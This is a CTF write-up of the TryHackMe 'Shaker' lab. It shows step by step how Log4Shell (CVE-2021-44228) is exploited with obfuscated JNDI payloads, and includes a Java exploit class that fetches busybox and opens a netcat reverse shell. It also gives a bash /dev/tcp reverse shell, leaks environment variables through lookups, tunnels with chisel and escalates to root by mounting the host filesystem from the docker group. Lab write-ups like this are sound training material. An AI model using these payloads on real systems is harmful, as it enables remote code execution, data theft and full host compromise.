Title: TryHackMe: Shaker Writeup
Date: 2022-01-26 12:00
Modified: 2022-01-26 12:00
Category: Writeups
Tags: writeup, Log4j, Log4Shell, Docker, Containers
Slug: tryhackme-shaker
Authors: OmegaVoid
Summary: I don't often post writeups for CTF rooms, but I decided to make an exception for Shaker at TryHackme because I thought it not only did a very good demonstration of the impact of the recently infamous Log4Shell vulnerability but also showcased how hard it can be to secure a docker container.

I don't often post writeups for CTF rooms, but I decided to make an exception for Shaker at TryHackme because I thought it not only did a very good demonstration of the impact of the recently infamous Log4Shell vulnerability but also showcased how hard it can be to secure a docker container.

For full disclosure, I tested this room before release and provided feedback to the author (Hydragyrum) during development. I did so without access to a walkthrough, however, to attempt to simulate the challenge the end-user would actually be faced with. The machine has since then been given a couple of changes and further hardening. The present writeup, however, represents the current iteration of the room, at the time of writing and not the earlier testing version.

The author's writeup can be found at: [https://hydrashead.net/posts/thm-shaker/](https://hydrashead.net/posts/thm-shaker/)

I deviate from it quite a bit, however, and use it to demonstrate a few simpler attack techniques.

##Reconnaissance

We'll start by doing a port and service scan with Nmap.

```bash
sudo nmap -sC -sV -p- -Pn 10.10.x.x -T4 -vv
```

Truncating the the results for brevity can easily identify two ports:

```bash
PORT     STATE  SERVICE    REASON         VERSION
22/tcp   open   ssh        syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
| ...
8080/tcp open   http-proxy syn-ack ttl 62
| ...
9090/tcp closed zeus-admin reset ttl 63
```

We know we have an HTTP server on port 8080, and an OpenSSH on port 22 as is standard. We started by just browsing to the HTTP server and taking a look at the web application.

![Application Screenshot.](/images/shaker/app.png)

It's a simple application that takes an XML file and does something to it. So we create a very simple XML file, to see what exactly it does.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<post>
    <author>OmegaVoid</author>
    <title>Shaker</title>
    <description>This is not the actual blog post xml, but how meta.</description>
    <tag>writeup</tag>
</post>
```

We'll name it `post.xml` and upload it to the application.

![Application result after uploading post.xml.](/images/shaker/app-response.png)

The result is it just reordered the items in XML. Pretty useless application, but now we have a baseline knowledge of what it does.

The `Download Here!` link is: `http://10.10.x.x:8080/uploads/22c62a3ceca270.xml`

Which reveals an upload folder, and the xml has been renamed.

At this point we'd naturally be thinking that we could be facing an XXE or File Upload vulnerability. 
However, if you go in that direction, we will quickly find ourselves in a rabbit hole, and none of our payloads seem to work. 

And if payloads don't work after a few minutes/hours, we force ourselves to move on.

But we're not done with Recon. There's a couple of extra hints in this last page.

Looking at the source code:

![Comment in the source code.](/images/shaker/source-comment.png)

At the time of room release, this should be instantly firing up alerts on your brain. If not, there's another hint in the favicon:

![Application Favicon](/images/shaker/favicon.png)

Most people I know missed that one, but it's pretty normal to not notice favicons, and a custom one might not exactly catch your attention, so don't stress it. It's pretty funny though - and a clear reference to Log4Shell - CVE-2021-44228. For a great post about it see: [https://www.lunasec.io/docs/blog/log4j-zero-day/](https://www.lunasec.io/docs/blog/log4j-zero-day/)

Either way, finding a mention to logs should have been enough to get us started. At this point, we could start fuzzing to search for the logs, and trying to use a custom number list to find those 4 suffix numbers, in an attempt to get access to the actual log files. This would facilitate our exploitation.

However, this is not strictly necessary, and I actively avoided it because Hydragyrum is known for having fail2ban bruteforce protection on his challenges. Turns out he didn't have it enabled on this one, so we missed that, but we'll use the opportunity to do some black-box exploitation.


##Log4Shell - CVE-2021-44228

Log4Shell is a now infamous vulnerability that the infosec community will be hearing about for years to come. This flaw the Log4j java software component has a varied impact and can be exploited in multiple ways. The most common method of exploitation consists of providing a specific string to application inputs, and when that message is logged it causes a message lookup, which starts a request via JNDI (Java Naming and Directory Interface) which uses a directory service (like LDAP) to obtain and execute Java resources, resulting in RCE (Remote Code Execution).

> It is worth pointing out that there are other possibilities of exploitation. For insntance, even if RCE is not obtained it can be possible to use this to exfiltrate Environment Variables via non JNDI payloads such as `${env:USERNAME}` (so keep your env close and your AWS API keys closer). We can even nest these lookups to exfiltrate data via DNS, or other services. We will make use of this later.

For some detailed instructions on this vulnerability and how to exploit it see the room: [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)

The exploit essentially consists of 4 steps:

1.  We submit a payload on a logged input in the application.
2.  The application processes the message lookup and requests the java resource from a directory service (LDAP in this case).
3.  LDAP provides a reference to the location where the java resource can be obtained.
4.  Application download the java resource, and executes it.

Ok. Now that I've bored you to death with a bit of details, what can we do in our application? We can supply as many inputs as we find with the payload until we find something vulnerable. We can try the XML filename, we can try the XML content, we can try different headers in our HTTP request, etc.

> Note: If we had fuzzed and found the logs, we would have a better understanding of what's being logged, and we could build our payload faster. But we decided not to, and so with less enumeration, things get dirtier.

How do we do this? We place the following payload on all the possible inputs we can think of (one at a time):

```bash
${jndi:ldap://ATTACKER_IP_ADDRESS:8080/}
```

And we start a netcat listener on port 8080.

We tried a few things and when we tried the xml content:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<post>
  <author>${jndi:ldap://ATTACKER_IP_ADDRESS:8080/}</author>
  <title>Shaker</title>
  <description>This is not the actual blog post xml, but how meta.</description>
  <tag>writeup</tag>
</post>
```

We got the response:

![Invalid XML response.](/images/shaker/invalid.png)

Ok. There's a filter in place. So, let's try the simplest of filter bypasses:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<post>${${::-j}ndi:ldap://ATTACKER_IP_ADDRESS:8080/}</post>
```

The application hangs, and we get a call on our listener

![The target callback proving it's vulnerable.](/images/shaker/callback.png)

Ok. So we know the target is vulnerable. So we need to set up the remaining steps for exploitation, to try to obtain RCE.

We start a marshalsec (`**https://github.com/mbechler/marshalsec**`) utility to serve as an LDAP referral service.

```bash
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ATTACKER_IP_ADDRESS:8000/#Exploit
```

This outputs “Listening on 0.0.0.0:1389” which mean that if we point our payload to:

```url
ldap://ATTACKER_IP_ADDRESS:1389/Exploit
```

It will then tell the server to download Exploit.class from port 8000 on our attack machine.

So all we need now is an Exploit.class

We will start with a simple exploit from the Solar room I mentioned earlier.

```java
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("ping -c 4 ATTACKER_IP_ADDRESS");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

We compile it with a java 8 compiler:

```bash
javac Exploit.java
```

And host it on port 8000 with `python3 -m http.server` or `updog`.

To check if we have RCE, we start tcp dump and look for pings:

```
sudo tcpdump -i tun0 icmp
```

And finally we upload our payload:

```xml
<?xml version="1.0"?>
<post>${${::-j}ndi:ldap://ATTACKER_IP_ADDRESS:1389/Exploit}</post>
```

And while we see a call on both marshall and our http server, we do not get a ping.

![The application requests our exploit from marshalsec.](/images/shaker/call-marshalsec1.png)

There could be multiple reasons for this. One of them could simply be that there's no ping binary. We tried a few other commands to no avail. No bash, no netcat, no wget, no curl.

The author probably removed what he considered unnecessary binaries from container in an effort harden it further. This is a legitimate tactic as it makes living off the land much harder and increases the skill requirements for exploitation. However, with a vulnerability like log4j this is clearly insufficient because the vulnerability is essentially giving you programmatic access to all the features of the operating system.

You don't have curl? Java can download for you. You don't have chmod? Java can change file permissions for you. We can take this as far as we want. However, if we're going to create a file, we have to deploy it somewhere we know we have permissions to.

I tried /tmp/ at first but was unable to exploit, which means Hydragyrum probably hardened that as well. But we know exactly where we can create a file in the filesystem. The application's uploads folder.

So let's check the context of the application:

```xml
<?xml version="1.0"?>
<post>${${::-j}ndi:ldap://ATTACKER_IP_ADDRESS:1389/${env:PWD}}</post>
```
We use this payload to leak the PWD environment variable which tells us the current path where the application is being executed.

This return the following in marshalsec:

```bash
Send LDAP reference result for /app redirecting to http://ATTACKER_IP_ADDRESS:8000/Exploit.class
```

This tells us the application is running in `/app` . So we will attempt to upload a binary to `/app/uploads` (or we could use a relative path since we're already in `/app`).

To make thing easier for ourselves, we can now use java to upload a busybox static binary, make it executable and then make use of all the tools included in busybox to exploit the target.

You can obtain busybox binaries from: [https://busybox.net/downloads/binaries/](https://busybox.net/downloads/binaries/)

We'll host it on the same http server as our java exploit.

Then we craft our java exploit to download busybox, change permissions, and execute a command that will give us a shell on port 8080.

```java
import java.io.*;
import java.lang.*;
import java.nio.file.StandardCopyOption;
import java.net.URL;
import java.nio.file.Paths;
import java.nio.file.Files;

public class Exploit {
    static {
        try {

            String ip = "ATTACKER_IP_ADDRESS";

            //Download the file
            String FILE_URL = "http://"+ip+":8000/busybox";
            String FILE_PATH = "/app/uploads/busybox";

            InputStream in = new URL(FILE_URL).openStream();
            Files.copy(in, Paths.get(FILE_PATH), StandardCopyOption.REPLACE_EXISTING);

            File file = new File(FILE_PATH);

            //check if file exists
            if(file.exists()){

                //change file permissions
                file.setExecutable(true);
                file.setReadable(true);
                file.setWritable(false);

            }

            //Execute a command that gives us a reverse shell
            Runtime r = Runtime.getRuntime();
            Process p = r.exec("/app/uploads/busybox nc "+ip+" 8080 -e /app/uploads/busybox sh");
            p.waitFor();


        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

We compile it, set up a listener on port 8080, and send our payload again:

```xml
<?xml version="1.0"?>
<post>${${::-j}ndi:ldap://ATTACKER_IP_ADDRESS:1389/Exploit}</post>
```

![We get a reverse shell.](/images/shaker/revshell.png)


And we obtain our user shell. And the first flag as well.

## Docker Enumeration

Looking at the root of the filesystem we can see we're in a docker container. We can also confirm that `/tmp` was indeed not writable by user 1000.

![Container file system.](/images/shaker/container-fs.png)

We could have written busybox directly to `/app`, but we knew for sure that we could place it in uploads.

We'll start docker enumeration with the network side of things. As suspected earlier, the container is missing a lot of useful binaries, but that's not a problem since we uploaded busybox.
First step is obtaining the IP address of the container:

![Obtaining the IP address](/images/shaker/container-ip.png)

Using `ip route get 1` to obtain the address of the host:

![Obtaining Host IP.](/images/shaker/container-ip-route.png)

At this point one option is to ping sweep for other containers, the other is to port scan the host to try to see what other services it might be running. For either option a static nmap binary would greatly facilitate things.

We download nmap and port scan the host.

![Host Nmap Scan.](/images/shaker/container-nmap.png)

We know that port 8080 is a port forward to the container we're in. But what is port 8888.

At this point we could continue enumerating docker for other vulnerabilities and misconfigurations (in a penetration test we would do a full assessment of the container), but as we'll see it proved unnecessary for our objectives.

## Attacking the Host

To check if it's an http server we can use curl, we had to download another static binary since it's not in the system:
![Curl request to 172.18.0.1:8888.](/images/shaker/host-curl.png)

It's throwing us a Bad Request error, but it seems to reply, so we know we have something to investigate.

To take a better look at this service, we decide to use [chisel](https://github.com/jpillora/chisel) to port forward port 8888 to localhost:8888 on our attack machine.

We use busybox once again to download chisel on the machine.

On our machine we start a chisel server on port 9999:

![Starting the chisel server](/images/shaker/chisel-server.png)

On the target machine we start a client that forwards port 172.18.0.1:8888 to the chisel server.

```bash
./chisel client ATTACKER_IP_ADDRESS:9999 R:8888:172.18.0.1:8888`
```

On our server we can confirm this is working:

![Chisel server receives the port forward.](/images/shaker/chisel-listening.png)

Let's see what our browser tells us.

![Whitelabel Error Page.](/images/shaker/whitelabel-error.png)

If we look up this error we can quickly find out that this is Spring Boot.

First google result:

![White Label Error Page is a Spring Boot error page.](/images/shaker/whitelabel-google.png)

Ok, so we know we're dealing with Spring Boot and tomcat. So we're still in the realm of Java applications. Are we still dealing with Log4j?

It's a possibility, but first we need to figure out why our request is bad. Let's try the HTTP Options method.

![HTTP Options Request and Response.](/images/shaker/http-options.png)

This tells us we need to use an X-Api-Version header, so let's try using it.

![With the X-Api-Version header.](/images/shaker/x-api-header.png)

Ok, we have a valid request. It stands to reason that X-API-Versions would be logged per request, so we can start by injecting our Log4J payload there. And see if marshalsec gets any requests.

```bash
curl -H 'X-API-Version: ${jndi:ldap://ATTACKER_IP_ADDRESS:1389/Exploit}' http://127.0.0.1:8888
```

We unfortunately do not get a call back on marshalsec. And the response:

![Error 418](/images/shaker/teapot.png)

Very interesting, I'm pretty sure I didn't request it to make coffee but it's giving me the famous teapot error code. It's probably the developer implementing another filter:

```bash
curl -H 'X-API-Version: ${${::-j}ndi:${::-l}dap://ATTACKER_IP_ADDRESS:1389/Exploit}' http://127.0.0.1:8888
```

This seems to work. We get a callback on marshalsec:

![Callback to Marshalsec.](/images/shaker/call-marshalsec2.png)

But curiously this results in no request on our HTTP server. This means LDAP probably wont cut it. Maybe it's a different JVM version or the software doesn't trust the LDAP reply.

Some further research into Spring boot and JNDI led us to: [https://www.veracode.com/blog/research/exploiting-jndi-injections-java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)
This, interestingly talks about another, earlier, exploit. It is demonstrated using RMI, which is interesting. So perhaps, it's still possible to exploit this older vulnerability using Log4shell style lookups, via a malicious RMI server.

Ok, so at this point we can close marshalsec and look for alternatives. We could use veracode's PoC above, but I found this pearl which faciliates the exploit quite a bit:

[https://github.com/pimps/JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit)

This also incorporates a number of other things, including integration of YSOSerial payloads which can be very useful in other deserialization challenges.

Let's take a look at our options here:

![JNDI-Exploit-Kit Help.](/images/shaker/JNDI-Kit-help.png)

Ok, so let's try creating an RMI server that will try to execute a bash command that will give us a reverse shell on port 4455:

```bash
java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -C 'bash -i &>/dev/tcp/ATTACKER_IP_ADDRESS/4455 <&1' -R ATTACKER_IP_ADDRESS:1389 -O RMI
```
Here, our reverse shell is provided by a simpler bash reverse shell payload. This is because we're attacking the Host system, so I expected the extent of system hardening to be much lower so we should be able to just execute bash.
This JNDI exploit kit creates a nice list of URLs serving the payloads we can use:

![Payload List.](/images/shaker/JNDI-Kit.png)

We pick the exploit whose trustURLCodebase is false but have Tomcat 8+ or SpringBoot, which likely bypasses the filter that did not allow marshalsec's referal to work.

We simply have to call the provided URL from our log4j payload:

```bash
curl -H 'X-API-Version: ${${::-j}ndi:${::-r}mi://ATTACKER_IP_ADDRESS:1389/ozbud1}' http://127.0.0.1:8888
```

And catch a shell on our listener (I used pwncat in this example, which automatically stabilizes our shell):

![Reverse Shell on the Host.](/images/shaker/pwncat.png)

And we are now be able to obtain bob's host flag.

We use pwncat to upload linpeas, make it executable and run it and take a look at the output.

![Bob is a member the docker group.](/images/shaker/docker-group.png)

Bob seems to be a member of the docker group, and docker socket is writable:

![Writable Docker Socket.](/images/shaker/docker-socket.png)

That's all we need to know we can obtain root privileges on this machine.

![Docker Containers and Images.](/images/shaker/containers-images.png)

We can see the shaker container and its image in the docker repository.

But we also know this image is severely limited. So instead we'll make our own.

On our machine we pull alpine:latest:
```bash
docker pull alpine:latest
```
Then we can use the save option to save an image to tar file:
```bash
docker image save alpine -o alpine.tar 
```
Then we upload this to the target machine and load it with:
```bash
docker image load -i alpine.tar
```

Finally we escalate to root by using this alpine image to spawn a container that mounts the host filesystem:
```bash
docker run -it -v /:/host/ alpine:latest chroot /host/ bash
```
![Obtained root privileges.](/images/shaker/root.png)

All that there's left to do is obtain the root flag.